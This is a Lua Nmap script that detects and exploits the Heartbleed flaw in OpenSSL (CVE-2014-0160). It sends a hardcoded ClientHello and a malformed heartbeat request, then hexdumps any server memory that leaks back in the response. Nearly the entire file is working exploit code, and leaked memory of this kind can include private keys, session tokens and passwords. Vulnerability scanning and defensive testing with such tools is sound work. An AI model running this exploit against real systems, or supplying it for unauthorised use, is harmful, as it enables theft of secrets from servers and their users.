local shortport = require 'shortport'
local string = require 'string'
local stdnse = require 'stdnse'
local match = require 'match'
local bin = require 'bin'

description = [[
Discovers and exploits TLS heartbeat read overrun (CVE-2014-0160). Based
on PoC by Jared Stafford (jspenguin@jspenguin.org) and others.

Still in PoC state.
]]

author = "takeshix <takeshix@adversec.com>"
categories = {'discovery', 'default'}

---
--@output
-- 443/tcp open  https   syn-ack
-- |_heartbleed: Host is vulnerable to TLS heartbeat read overrun (CVE-2014-0160). Increase debug level for a dump of leaked data.
--@xmloutput
-- true

portrule = function(host, port)
  return shortport.ssl(host, port)
end

local hello = bin.pack('H','16030200dc010000d8030253435b909d9b720bbc0cbc2b92a84897cfbd3904cc160a8503909f770433d4de000066c014c00ac022c0210039003800880087c00fc00500350084c012c008c01cc01b00160013c00dc003000ac013c009c01fc01e00330032009a009900450044c00ec004002f00960041c011c007c00cc002000500040015001200090014001100080006000300ff01000049000b000403000102000a00340032000e000d0019000b000c00180009000a00160017000800060007001400150004000500120013000100020003000f0010001100230000000f000101')
local hb = bin.pack('H','1803020003014000')

function hexdump(s)
    local manLine="" --human readable format of the current line
    local hexLine="" --hexadecimal representation of the current line
    local address=0     --the address where the current line starts
    local LINE_LENGTH=16 --how many characters per line?
    local ADDRESS_LENGTH=4 --how many characters for the address part?
    local ret=""
    local hex
    if not hex then
        hex={}
        local digit={[0]="0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"}
        for i=0,15 do for j=0,15 do hex[i*16+j]=digit[i]..digit[j] end end
    end
    for i=1,s:len() do
        local ch=s:sub(i,i)
        if ch:find("%c") then ch="." end--if ch is a control character, assign some default value to it
        manLine=manLine..ch
        hexLine=hexLine..hex[s:byte(i)].." "
        if (i % LINE_LENGTH)==0 or i==s:len() then
            --print(string.format("%04u | %-48s | %s",address,hexLine,manLine))
            ret=ret..string.format("%0"..ADDRESS_LENGTH.."u | %-"..3*LINE_LENGTH.."s| %s\n",address,hexLine,manLine)
            manLine,hexLine="",""
            address=i
        end
    end
    return ret
end

local function getTlsMsg(socket)
    local status,data,typ,ver,ln,payload,err
    status,hdr,err = socket:receive_buf(match.numbytes(5),true)
    if not status then
        stdnse.print_debug('Error while receiving server message: %s',hdr)
        return nil,nil,nil
    end
    pos,typ,ver,len = bin.unpack('>CSS',hdr)
    status,payload,err = socket:receive_buf(match.numbytes(len), true)
    if not status then
        stdnse.print_debug('Error while receiving payload from server: %s',payload)
        return nil,nil,nil
    end
    
    return tonumber(typ),payload
end


action = function(host, port)
    local socket = nmap.new_socket()
    socket:set_timeout(1000)
    status,err = socket:connect(host.ip, port.number)
    if not status then
        socket.close()
        stdnse.print_debug("Could not establish TCP connection: %s", err)
        return nil
    end

    status,err = socket:send(hello)
    if not status then
        socket.close()
        stdnse.print_debug("Could not send ClientHello message: %s", err)
        return nil
    end

    while true do
        local typ,payload = getTlsMsg(socket)
        if not typ then
            stdnse.print_debug('Something went terribly wrong')
            return nil
        end
        if typ == 22 and string.byte(payload,1) == 14 then
            break
        else
            stdnse.print_debug(2,'type:%s,len:%s',typ,string.len(payload))
        end
    end

    local status,err = socket:send(hb)
    if not status then
        socket.close()
        stdnse.print_debug("Could not send HeartbeatRequest message: %s", err)
        return nil
    end

    while true do
        local typ,payload = getTlsMsg(socket)
        if not typ then
            stdnse.print_debug('No heartbeat response received, server likely not vulnerable')
            return nil
        elseif not payload then
            stdnse.print_debug('Unexpected EOF.')
            return nil
        end

        if typ == 24 then
            stdnse.print_debug('Received heartbeat response')
            if string.len(payload) > 3 then
                stdnse.print_debug('Server leaked memory!')
                stdnse.print_debug('%s',hexdump(payload))
                return true,'Host is vulnerable to TLS heartbeat read overrun (CVE-2014-0160). Increase debug level for a dump of leaked data.'
            else
                stdnse.print_debug('Server processes malformed heartbeat, but did not return any leaked memory')
            end
        end

        if typ == 21 then
            stdnse.print_debug('Server error, likely not vulnerable')
            return nil
        end 
    end

    socket:close()
    return nil
end
